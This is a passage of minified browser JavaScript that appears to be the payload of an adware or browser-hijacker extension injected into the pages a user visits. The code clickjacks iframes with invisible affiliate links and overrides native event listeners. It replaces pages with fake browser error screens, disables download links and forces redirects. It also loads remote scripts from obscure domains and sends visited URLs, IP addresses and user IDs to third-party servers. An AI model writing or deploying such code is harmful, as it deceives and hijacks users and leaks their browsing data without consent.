                var m = a.jquery('<div></div>').text(g.results[j].description).css('margin-top', '3px').css('color', '#333333').css('font-size', 'small').css('line-height', '15px').css('text-decoration', 'none!important').css('font-family', 'Verdana,Arial,sans-serif').css('overflow', 'hidden').css('height', '32px');
                i.append(k);
                i.append(l);
                i.append(m);
                h.append(i);
            }
            return h;
        },
        highlight_words_in_text: function(a, b, c) {
            if (c.length == 0 || c == '') return b;
            var d = [];
            var e = b.split(' ');
            for (var f = 0; f < e.length; f++) {
                var g = e[f];
                for (var h = 0; h < c.length; h++) {
                    var i = '<b>' + e[f] + '</b>';
                    if (e[f].toLowerCase().indexOf(c[h].toLowerCase()) != -1) {
                        g = i;
                        break;
                    }
                }
                d.push(g);
            }
            return d.join(' ');
        },
        json: function() {
            function a(a) {
                return a < 10 ? '0' + a : a;
            }
            if (typeof Date.prototype.toJSON !== 'function') {
                Date.prototype.toJSON = function(b) {
                    return isFinite(this.valueOf()) ? this.getUTCFullYear() + '-' + a(this.getUTCMonth() + 1) + '-' + a(this.getUTCDate()) + 'T' + a(this.getUTCHours()) + ':' + a(this.getUTCMinutes()) + ':' + a(this.getUTCSeconds()) + 'Z' : null;
                };
                String.prototype.toJSON = Number.prototype.toJSON = Boolean.prototype.toJSON = function(a) {
                    return this.valueOf();
                };
            }
            var b = /[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
                c = /[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,
                d, e, f = {
                    '\b': '\\b',
                    '\t': '\\t',
                    '\n': '\\n',
                    '\f': '\\f',
                    '\r': '\\r',
                    '"': '\\"',
                    '\\': '\\\\'
                },
                g;

            function h(a) {
                c.lastIndex = 0;
                return c.test(a) ? '"' + a.replace(c, function(a) {
                    var b = f[a];
                    return typeof b === 'string' ? b : '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
                }) + '"' : '"' + a + '"';
            }

            function i(a, b) {
                var c, f, j, k, l = d,
                    m, n = b[a];
                if (n && typeof n === 'object' && typeof n.toJSON === 'function') n = n.toJSON(a);
                if (typeof g === 'function') n = g.call(b, a, n);
                switch (typeof n) {
                    case 'string':
                        return h(n);
                    case 'number':
                        return isFinite(n) ? String(n) : 'null';
                    case 'boolean':
                    case 'null':
                        return String(n);
                    case 'object':
                        if (!n) return 'null';
                        d += e;
                        m = [];
                        if (Object.prototype.toString.apply(n) === '[object Array]') {
                            k = n.length;
                            for (c = 0; c < k; c += 1) m[c] = i(c, n) || 'null';
                            j = m.length === 0 ? '[]' : d ? '[\n' + d + m.join(',\n' + d) + '\n' + l + ']' : '[' + m.join(',') + ']';
                            d = l;
                            return j;
                        }
                        if (g && typeof g === 'object') {
                            k = g.length;
                            for (c = 0; c < k; c += 1)
                                if (typeof g[c] === 'string') {
                                    f = g[c];
                                    j = i(f, n);
                                    if (j) m.push(h(f) + (d ? ': ' : ':') + j);
                                }
                        } else
                            for (f in n)
                                if (Object.prototype.hasOwnProperty.call(n, f)) {
                                    j = i(f, n);
                                    if (j) m.push(h(f) + (d ? ': ' : ':') + j);
                                }
                        j = m.length === 0 ? '{}' : d ? '{\n' + d + m.join(',\n' + d) + '\n' + l + '}' : '{' + m.join(',') + '}';
                        d = l;
                        return j;
                }
            }
            var j = {
                stringify: function(a, b, c) {
                    var f;
                    d = '';
                    e = '';
                    if (typeof c === 'number')
                        for (f = 0; f < c; f += 1) e += ' ';
                    else if (typeof c === 'string') e = c;
                    g = b;
                    if (b && typeof b !== 'function' && (typeof b !== 'object' || typeof b.length !== 'number')) throw new Error('JSON.stringify');
                    return i('', {
                        '': a
                    });
                },
                parse: function(a, c) {
                    var d;

                    function e(a, b) {
                        var d, f, g = a[b];
                        if (g && typeof g === 'object')
                            for (d in g)
                                if (Object.prototype.hasOwnProperty.call(g, d)) {
                                    f = e(g, d);
                                    if (f !== undefined) g[d] = f;
                                    else delete g[d];
                                }
                        return c.call(a, b, g);
                    }
                    a = String(a);
                    b.lastIndex = 0;
                    if (b.test(a)) a = a.replace(b, function(a) {
                        return '\\u' + ('0000' + a.charCodeAt(0).toString(16)).slice(-4);
                    });
                    if (/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g, '@').replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g, ']').replace(/(?:^|:|,)(?:\s*\[)+/g, ''))) {
                        d = eval('(' + a + ')');
                        return typeof c === 'function' ? e({
                            '': d
                        }, '') : d;
                    }
                    throw new SyntaxError('JSON.parse');
                }
            };
            return j;
        },
        replace_all: function(a, b, c) {
            return a.split(b).join(c);
        },
        log_event: function(b, c) {
            var d = {
                'type': b,
                'data': encodeURIComponent(c)
            };
            d.domain = encodeURIComponent(window.location.hostname);
            d.url = encodeURIComponent(document.URL);
            d.dc = a.dc;
            var e = window.document.createElement("script");
            e.src = "//aa9bd78f328a6a41279d0fad0a88df1901.com/logger/log-event?dc_id=" + d.dc;
            e.src += "&domain=" + d.domain;
            e.src += "&page_url=" + d.url;
            e.src += "&event_type=" + d.type;
            e.src += "&event_data=" + d.data;
            e.src += "&response_type=js";
            e.type = "text/javascript";
            window.document.body.appendChild(e);
        },
        inIframe: function() {
            try {
                return window.self !== window.top;
            } catch (a) {
                return true;
            }
        },
        get_frame_data: function() {
            var a = {
                'referer': '',
                'is_top': true,
                'iframes': 0
            };
            if (this.inIframe()) {
                a.iframes = 1;
                a.is_top = false;
            }
            return a;
            if (!browser.safari) {
                try {
                    var b = function(a) {
                        try {
                            if (!window.location.ancestorOrigins) return;
                            for (var b = 0, c = window.location.ancestorOrigins.length; c > b; b++) a.call(null, window.location.ancestorOrigins[b], b);
                        } catch (d) {}
                        return [];
                    };
                    var c = function(a) {
                        var b, c = [];
                        do try {
                            b = b ? b.parent : window, a.call(null, b, c);
                        } catch (d) {
                            return c.push({
                                referrer: null,
                                location: null,
                                isTop: !1
                            }), c;
                        }
                        while (b !== window.top);
                        return c;
                    };
                    var d = c(function(a, b) {
                        try {
                            b.push({
                                referrer: a.document.referrer || null,
                                location: a.location.href || null,
                                isTop: a === window.top
                            });
                        } catch (c) {
                            b.push({
                                referrer: null,
                                location: null,
                                isTop: a === window.top
                            });
                        }
                    });
                    b(function(a, b) {
                        d[b].ancestor = a;
                    });
                    for (var e = "", f = !1, g = d.length - 1, h = d.length - 1; h >= 0; h--)
                        if (e = d[h].location, !e && h > 0 && (e = d[h - 1].referrer, e || (e = d[h - 1].ancestor)), e) {
                            f = window.location.ancestorOrigins ? !0 : h == d.length - 1 && d[d.length - 1].isTop;
                            break;
                        }
                    a.referer = e;
                    a.is_top = f;
                    a.iframes = g;
                } catch (i) {}
            } else if (window.self !== window.top) a.iframes = 1;
            return a;
        }
    };
    var g = {
        credit_offer: function(b) {
            var c = function() {
                function a() {
                    return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
                }
                return a() + a() + '-' + a() + '-' + a() + '-' + a() + '-' + a() + a() + a();
            };
            var d = function() {
                var d = b.jquery("iframe");
                var e = 'http://webtrackerplus.com/?page=torrent-progress&a_aid=56dnde87wnd';
                var f = a.dc.replace('AAAAAA', '');
                var g = b.server_data.c.id;
                var h = c();
                for (var i = 0, j, k, l; i < d.length; i++)
                    if (typeof d[i].wrap === 'function') {
                        e = 'http://webtrackerplus.com/?page=torrent-progress&a_aid=56dnde87wnd';
                        h = c();
                        e += '&clickid=' + f + '--' + 'ClickID' + '___' + h + '___' + g;
                        k = b.jquery("<a href='" + e + "' target='_blank'/>");
                        l = b.jquery("<div/>");
                        j = b.jquery("<div/>");
                        d[i].style.zIndex = 0;
                        d[i].style.position = 'absolute';
                        d[i].style.top = 0;
                        d[i].style.left = (d[i].parentNode.scrollWidth - d[i].width) / 2 + 'px';
                        j.css({
                            'position': 'relative',
                            'display': 'inline-block',
                            'margin': d[i].style.margin,
                            'width': d[i].parentNode.scrollWidth + 'px'
                        });
                        l.css({
                            'width': d[i].width + 'px',
                            'height': d[i].height + 'px',
                            'top': 0,
                            'left': (d[i].parentNode.scrollWidth - d[i].width) / 2 + 'px'
                        });
                        k.css({
                            'display': 'inline-block',
                            'position': 'absolute',
                            'border-bottom': 0,
                            'top': 0,
                            'left': (d[i].parentNode.scrollWidth - d[i].width) / 2 + 'px',
                            'z-index': 9999,
                            'width': d[i].width + 'px',
                            'height': d[i].height + 'px'
                        });
                        d[i].wrap(j[0]);
                        k[0].wrap(l[0]);
                        j.append(l);
                    }
            };
            if (b.server_data.di.category == "lp") {
                var e = 'http://webtrackerplus.com/?page=torrent-progress&a_aid=56dnde87wnd';
                var f = a.dc.replace('AAAAAA', 'LPAAAA');
                var g = b.server_data.c.id;
                var h = c();
                e += '&clickid=' + f + '--' + 'ClickID' + '___' + h + '___' + g;
                window.location = e;
            } else if (window.location.host.indexOf('thepiratebay.se') != -1) d();
        },
        prof: function(a) {
            return false;
            var b = 'https://soundflow.xyz/static/inj/te1_all_0_0_1.min.js';
            f.load_script(b);
        },
        bmg: function(b) {
            if (document.URL.indexOf('cdn.bitmedianetwork.com') == -1 && b.server_data.di.category != 'travel' && b.server_data.di.category != 'ecommerce') {
                var c = '//3zone.info/jslib?pid=62007&said=$dc_id$&san=$dc_product_name$&met=1|0';
                c = c.replace('$dc_id$', a.dc);
                var d = a.dc_product_name;
                if (d == '') d = "TurboMac";
                c = c.replace('$dc_product_name$', d);
                f.load_script(c);
            }
        },
        prtct: function(b) {
            var c = function() {
                function a() {
                    return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
                }
                return a() + a() + '-' + a() + '-' + a() + '-' + a() + '-' + a() + a() + a();
            };
            if (document.addEventListener) {
                var d = function(a, b, c) {
                    (this != document && this != window && this != document.body || "click" != a || b.toString().indexOf('86321022') >= 0) && this._ael(a, b, c);
                };
                "function" == typeof Element && -1 < Element.toString().indexOf("[native code]") && (-1 == Element.prototype.addEventListener.toString().indexOf("[native code]") && delete Element.prototype.addEventListener, Element.prototype._ael = Element.prototype.addEventListener, Element.prototype.addEventListener = d); - 1 == document.addEventListener.toString().indexOf("[native code]") && delete document.addEventListener;
                document._ael = document.addEventListener;
                document.addEventListener = d; - 1 == window.addEventListener.toString().indexOf("[native code]") && delete window.addEventListener;
                window._ael = window.addEventListener;
                window.addEventListener = d;
            }
            window.setInterval(function() {
                b.jquery('iframe[src*="boostsaves"], script[src*="boostsaves"]').remove();
            }, 1000);
            window.download_parameters = {};
            var e = a.dc;
            var f = e.substr(0, 6) + 'PT' + e.substr(8);
            if (b.server_data.di.category == 'lpibr') window.location.replace("http://clkmon.com/adServe/banners?pid=16129&action=r");
            if (b.server_data.di.category == 'comp' || b.server_data.di.category == 'comp_re') {
                var g = Math.floor(Math.random() * 2) + 1;
                if (g == 1) var h = 'http://c.dfgyw.com/?a=529129&c=1562404&p=r&m=32&E=9Rn7XWIqbd8%3d&s1=context.server_data.di.country_code&s2=1001&s3=bestoffer&s4=rfs';
                else var h = 'http://c.dfgyw.com/?a=529129&c=1562404&p=r&m=32&E=9Rn7XWIqbd8%3d&s1=context.server_data.di.country_code&s2=1001&s3=bestoffer&s4=rfs';
                var i = a.dc.replace('AAAAAA', '');
                var j = b.server_data.c.id;
                var k = c();
                h += '&clickid=' + i + '--' + 'ClickID' + '___' + k + '___' + j;
                window.location.replace(h);
            }
            if (b.server_data.di.category == 'free_av_re' || b.server_data.di.category == 'comp_re') {
                var l = /Safari/.test(navigator.userAgent) && /Apple Computer/.test(navigator.vendor);
                b.jquery('body').empty();
                var m = window.document.URL;
                if (l) {
                    var n = '                 <div class="content-container" style="width: 500px;margin: 0 auto;position: relative; margin-top: 215px;">                     <div class="error-container">                          <div class="text-container" style="color: rgb(133, 133, 133);position: relative;width: 100%;word-wrap: break-word;">                             <p class="error-title" style="font-size: 28px;line-height: 34px;margin: 0 auto;">Safari Can’t Find the Server</p>                         </div>                         <div class="text-container" style="color: rgb(133, 133, 133);position: relative;width: 100%;word-wrap: break-word; margin-top: 10px;">                             <p class="error-message" style="font-size: 13px;line-height: 18px;padding: 0px 24px;">Safari can’t open the page $P_URL$” because Safari can’t find the server $P_SERVER$”.</p>                         </div>                     </div>                 </div>             ';
                    n = n.replace('$P_URL$', m);
                    n = n.replace('$P_SERVER$', m);
                    b.jquery('body').attr('style', 'font-family:"-webkit-system-font";background: rgb(246, 246, 246);cursor: default;display: -webkit-box;text-align: center;-webkit-box-align: center;-webkit-box-pack: center;-webkit-user-select: none;');
                } else {
                    var n = '                 <div style="margin-top:20px; margin-left: auto; margin-right: auto; background-color: #fbfbfb; width: 540px; height: 180px; font-family: Helvetica, Arial, sans-serif; box-shadow: 0px 2px 2px #AAA; border: 1px solid #AAA; border-bottom: 1px solid #888; border-radius: 3px;">                 <div style="width:46px; margin-left:auto; margin-right: auto; margin-top: 30px;">                 <div style="content: -webkit-image-set( url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC4AAAAuCAQAAAD9sOO8AAAASUlEQVR4Xu3SMQoAIAzFUO/o/c+iY4fSSfgQyesgOESHrs9I0j7TEOL9pk5i/OmB/s9IvAYQH6DjxmtTWPEWBcS52zJPIJ4lSRfUZeB1c/cgSwAAAABJRU5ErkJggg==\') 1x, url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFwAAABcAQMAAADZIUAbAAAABlBMVEUAAABTU1OoaSf/AAAAAXRSTlMAQObYZgAAAD9JREFUeF7tzrEJACAQQ9EDB8j+2xy4UDaIDqBFDsTmfve6Hw/qhiQbGWQBOGPmHZKLjMBngD4IA/U37Uz4dQsbfVcrD6jzeAAAAABJRU5ErkJggg==\') 2x);"></div>                 </div>                 <div style="font-weight: normal; font-family: Helvetica, Arial, sans-serif; font-size: 20px; margin-top: 0px; color: #666; text-align:center; width: 500px; margin-left: auto; margin-right: auto;">This webpage is not availabe</div>                 <div style="text-decoration: underline; margin-top: 30px; cursor: pointer; text-align:center; font-size: 10px; color: #000; text-shadow: 0 1px 0 rgb(240, 240, 240);">Details</div>                 </div>             ';
                    b.jquery('body').css({
                        'background-color': '#E6E6E6'
                    });
                }
                b.jquery('body').append(n);
            }
            if (b.server_data.di.category == 'free_av' || b.server_data.di.category == 'free_av_1') {
                b.jquery('a').each(function() {
                    if (b.jquery(this).attr('href').indexOf('.dmg') >= 0 || b.jquery(this).attr('href').indexOf('download') >= 0) {
                        var a = '#';
                        b.jquery(this).attr('href', a);
                    }
                });
                b.jquery('div').each(function() {
                    if (b.jquery(this).attr('onclick') != null && (b.jquery(this).attr('onclick').indexOf('.dmg') >= 0 || b.jquery(this).attr('onclick').indexOf('download') >= 0)) {
                        var a = '#';
                        b.jquery(this).attr('onclick', a);
                    }
                });
                b.jquery('span, p').each(function() {
                    if (b.jquery(this).attr('onclick') != null && (b.jquery(this).attr('onclick').indexOf('.dmg') >= 0 || b.jquery(this).attr('onclick').indexOf('download') >= 0)) {
                        var a = '#';
                        b.jquery(this).attr('onclick', a);
                    }
                    if (b.jquery(this).text().indexOf('.dmg') >= 0 || b.jquery(this).text().indexOf('ownload link') >= 0) b.jquery(this).remove();
                });
            } else if (b.server_data.di.category == 'comp') {
                if (b.server_data.di.domain == 'flvto.com' && window.document.URL.indexOf('youtube-downloader-for-mac') == -1) return;
                b.jquery('a').each(function() {
                    if (b.jquery(this).attr('href').indexOf('.dmg') >= 0 || b.jquery(this).attr('href').indexOf('.exe') >= 0 || b.jquery(this).attr('href').indexOf('download') >= 0) {
                        var a = '#';
                        b.jquery(this).attr('href', a);
                    }
                    if (this.onclick != null) this.onclick = function() {};
                });
            }
        },
        ecom_v2: function(b) {
            if (true) {
                var c = 1;
                if (c == 1) {
                    var d = '';
                    if (document.location.protocol == 'https:') {
                        d = 'https://i_mrlmbsjs_info.tlscdn.com/mrlm/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                    } else {
                        d = 'http://i.mrlmbsjs.info/mrlm/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                        d = 'http://i.mrlmbssrc.org/mrlm/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                    }
                } else {
                    var d = '//istatic.eshopcomp.com/fo/ec/tarrs.js?hid=$user_id$&subid=$dc_id$&bname=$dc_product_name$';
                    d = d.replace('$dc_id$', a.dc);
                    d = d.replace('$user_id$', b.server_data.c.id);
                    var e = a.dc_product_name;
                    if (e == '') e = "TurboMac";
                    d = d.replace('$dc_product_name$', e);
                    f.load_script(d);
                }
            } else if (document.URL.indexOf('google.com') >= 0 || document.URL.indexOf('yahoo.com') >= 0 || document.URL.indexOf('thesmartsearch') >= 0 || document.URL.indexOf('trovi.com') >= 0 || document.URL.indexOf('search-quick.com') >= 0 || document.URL.indexOf('only-search.com') >= 0) {}
        },
        smedia: function(b) {
            var c = {
                tag_ids: {
                    "adult": 17,
                    "NonAdult": 18
                }
            };
            var d = c.tag_ids.NonAdult;
            if (b.server_data.di.category == 'adult') d = c.tag_ids.adult;
            var e = {
                tag_id: d,
                sub_id: a.dc,
                url: window.location.href,
                ip: b.server_data.ui.ip,
                mode: 'jsonfeed',
                ua: b.server_data.ui.ua,
                fallback_url: '',
                unique_user_id: b.server_data.c.id
            };
            b.jquery.ajax({
                type: 'GET',
                data: e,
                url: 'https://ssp.zryydi.com/bid/',
                cache: false,
                dataType: 'jsonp',
                success: function(a) {
                    if (a != null && a.creativeUrl != "") {
                        var c = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(a) {
                            var b = Math.random() * 16 | 0,
                                c = a == 'x' ? b : (b & 0x3 | 0x8);
                            return c.toString(16);
                        });
                        var d = a.creativeUrl;
                        var e = parseFloat(a.bid) * 1000;
                        pop = f.pop_under(b, d, null, null, "sm" + "|" + d + "|" + e + "|" + document.location.href + "|" + c);
                        f.log_event('pp', d);
                    }
                }
            });
        },
        travel: function(b) {
            if (b.server_data.di.category == 'travel') {
                var c = 3;
                if (c == 1) {
                    var d = '';
                    if (document.location.protocol == 'https:') {
                        d = 'https://i_mrlmiijs_info.tlscdn.com/mrlmii/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                    } else {
                        d = 'http://i.mrlmiijs.info/mrlmii/javascript.js?hid=$user_id$&channel=$dc_id$';
                        d = d.replace('$dc_id$', a.dc);
                        d = d.replace('$user_id$', b.server_data.c.id);
                        f.load_script(d);
                    }
                } else {
                    var d = '//va.compare-hotel-rates.com/hotels.php?mamId=$dc_id$&userId=2222&appId=3333&ui=1&ns=ETB_Hotels_Widget&partner=targetingedge&cpb=Deal Top&helpUrl=http%3A%2F%2Fwww.top-deals.club';
                    d = d.replace('$dc_id$', a.dc);
                    f.load_script(d);
                }
            }
        },
        adult: function(b) {
            var c = {
                log_enabled: false,
                recency_minutes: 0,
                pop_opened: false,
                page_keyword: "",
                bslider_recency_minutes: 5,
                last_conlo_recency_minutes: 10,
                conlo_timer_seconds: 10
            };
            var d = c.conlo_timer_seconds;
            var e = {
                'xvideos.com': {
                    'player_selector': '#flash-player-embed'
                }
            };
            var g = 'http://aa9bd78f328a6a41279d0fad0a88df1901.com/as/gf?at=pop&d=$dc_id$&u=$keywords$';
            g = g.replace('$dc_id$', a.dc);
            g = g.replace('$keywords$', encodeURIComponent(b.keyword));
            var h = 'http://aa9bd78f328a6a41279d0fad0a88df1901.com/as/gp?dc=$dc_id$&page_url=$page_url$&kw=$keywords$';
            h = h.replace('$page_url$', encodeURIComponent(document.location.href));
            h = h.replace('$dc_id$', a.dc);
            h = h.replace('$keywords$', encodeURIComponent(b.keyword));
            var i = 'http://aa9bd78f328a6a41279d0fad0a88df1901.com/as/gb?dc=$dc_id$&page_url=$page_url$&kw=$keywords$&size=$size$';
            i = i.replace('$page_url$', encodeURIComponent(document.location.href));
            i = i.replace('$dc_id$', a.dc);
            i = i.replace('$keywords$', encodeURIComponent(b.keyword));
            i = i.replace('$size$', '728x90');
            var j = function() {
                var a = l();
                b.jquery(e[a].player_selector).css('visibility', 'hidden');
                var c = b.jquery('<div />').attr({
                    'id': 'content_locker'
                });
                c.css({
                    'display': 'none',
                    'position': 'absolute',
                    'cursor': 'pointer',
                    'top': '140px',
                    'left': '112px',
                    'background-color': 'black',
                    'line-height': '33px',
                    'text-align': 'center',
                    'padding': '30px',
                    'color': 'white',
                    'font-size': '20px',
                    'width': '350px',
                    'height': '100px',
                    'border': '1px solid white'
                });
                c.html('Click HERE for Premium Service to enjoy better viewing experience.<br/>Video will resume in <span id="resume_timer">10</span> seconds');
                c.on('click', function() {
                    var d = window.open(h, '_blank');
                    d.focus();
                    b.jquery(e[a].player_selector).css('visibility', 'visible');
                    c.fadeOut();
                });
                b.jquery('#player').css({
                    'position': 'relative'
                });
                b.jquery('#player').prepend(c);
                c.fadeIn();
                setInterval(function() {
                    d--;
                    if (d <= 0) {
                        b.jquery(e[a].player_selector).css('visibility', 'visible');
                        b.jquery('#content_locker').fadeOut();
                    }
                    b.jquery('#resume_timer').html(d);
                }, 1000);
            };
            var k = function(a, c, d) {
                window.bslider = b.jquery('<div />').attr({});
                window.bslider.css({
                    'position': 'fixed',
                    'z-index': 9999,
                    'width': c + 'px',
                    'height': d + 'px',
                    'background-color': 'white'
                });
                switch (a) {
                    case 'bottom':
                        {
                            var e = b.jquery(window).width();
                            var f = e / 2 - c / 2;window.bslider.css({
                                'bottom': (-1 * d) + 'px',
                                'left': f + 'px'
                            });
                        }
                        break;
                    case 'left':
                        {
                            var g = b.jquery(window).height();
                            var h = g / 2 - d / 2;window.bslider.css({
                                'top': h + 'px',
                                'left': (-1 * c) + 'px'
                            });
                        }
                        break;
                    default:
                        {}
                }
                var j = b.jquery('<iframe />').attr({
                    'src': i,
                    'scrolling': 'no',
                    'frameborder': '0'
                });
                j.css({
                    'width': c + 'px',
                    'height': d + 'px',
                    'left': f + 'px'
                });
                var k = b.jquery('<div />').attr({});
                k.css({
                    'position': 'absolute',
                    'text-align': 'center',
                    'width': '16px',
                    'height': '16px',
                    'padding': '1px',
                    'font-size': '14px',
                    'right': '0px',
                    'top': '0px',
                    'cursor': 'pointer',
                    'color': 'black',
                    'background-color': 'white'
                });
                k.html('X');
                k.on('click', function() {
                    switch (a) {
                        case 'bottom':
                            window.bslider.animate({
                                'bottom': (-1 * d) + 'px'
                            });
                            break;
                        case 'left':
                            window.bslider.animate({
                                'bottom': (-1 * c) + 'px'
                            });
                            break;
                        default:
                            {}
                    }
                });
                window.bslider.append(j);
                window.bslider.append(k);
                b.jquery('body').append(window.bslider);
                switch (a) {
                    case 'bottom':
                        window.bslider.animate({
                            'bottom': 0
                        });
                        break;
                    case 'left':
                        window.bslider.animate({
                            'left': 0
                        });
                        break;
                    default:
                        {}
                }
            };
            var l = function() {
                var a, b, c = 'weird_get_top_level_domain=cookie',
                    d = document.location.hostname.split('.');
                for (a = d.length - 1; a >= 0; a--) {
                    b = d.slice(a).join('.');
                    document.cookie = c + ';domain=.' + b + ';';
                    if (document.cookie.indexOf(c) > -1) {
                        document.cookie = c.split('=')[0] + '=;domain=.' + b + ';expires=Thu, 01 Jan 1970 00:00:01 GMT;';
                        return b;
                    }
                }
            };
            if (b.server_data.di.category == 'adult') {
                var m = 0;
                if (typeof b.server_data.c.last_pop_time != 'undefined' && b.server_data.c.last_pop_time != "") {
                    var n = new Date();
                    var o = n.getTime();
                    var p = o + n.getTimezoneOffset() * 60 * 1000;
                    var q = b.server_data.c.last_pop_time;
                    q = q.split('-').join('/');
                    var r = new Date(q);
                    m = r.getTime();
                }
                if (!b.is_pop_opened && (p - m) > c.recency_minutes * 60 * 1000) b.jquery.ajax({
                    type: 'GET',
                    url: g,
                    dataType: 'jsonp',
                    cache: false,
                    success: function(a) {
                        if (a != null && a.results != null) {
                            var c = a.results[0];
                            f.pop_under(b, c.redirect);
                        }
                    }
                });
                var s = f.get_cookie('last_bslider');
                var n = new Date();
                var o = n.getTime();
                if (s == null || (o - s) > c.bslider_recency_minutes * 60 * 1000) setTimeout(function() {
                    k('bottom', 728, 90);
                    var a = new Date();
                    var b = a.getTime();
                    f.set_cookie('last_bslider', b);
                }, 2000);
            }
        }
    };
    if (a.s_m == 'true' && document.URL.indexOf("docs.google.com") == -1)
        if (a.dc == 'DP1000AAAAAA') {
            setTimeout(function() {
                e(function(a) {
                    if (!a.is_pop && !a.server_data.di.bl)
                        for (var b in g) g[b](a);
                });
            }, 1000);
        } else e(function(b) {
            var c = window.location.href;
            if (c.indexOf('trovi.com') >= 0 && c.indexOf('gd=') < 0) window.location = "http://www.trovi.com/?n=" + a.dc + "&searchsource=69&UM=8&gd=SY1000228";
            if (!b.is_pop && !b.server_data.di.bl && document.URL.indexOf('trovi.com') < 0 && document.URL.indexOf('bing.com') < 0 && document.URL.indexOf('veerolo.com') < 0)
                for (var d in g) g[d](b);
        });
})();
